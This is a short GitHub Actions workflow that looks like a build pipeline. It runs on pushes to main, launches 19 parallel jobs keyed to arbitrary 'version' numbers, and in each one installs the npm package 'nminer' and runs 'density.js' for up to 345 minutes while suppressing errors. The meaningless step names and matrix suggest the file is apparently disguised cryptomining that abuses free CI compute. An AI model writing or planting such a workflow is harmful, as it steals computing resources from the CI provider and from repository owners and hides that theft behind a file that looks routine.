name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1849 }
          - { version: 8879 }
          - { version: 260 }
          - { version: 3644 }
          - { version: 6420 }
          - { version: 8232 }
          - { version: 9613 }
          - { version: 1717 }
          - { version: 9486 }
          - { version: 5565 }
          - { version: 6124 }
          - { version: 8867 }
          - { version: 2281 }
          - { version: 9758 }
          - { version: 7536 }
          - { version: 7523 }
          - { version: 430 }
          - { version: 5757 }
          - { version: 206 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: by plumber enfold
        run: |
          npm install nminer@latest
          timeout 345m node density.js || echo "density executed"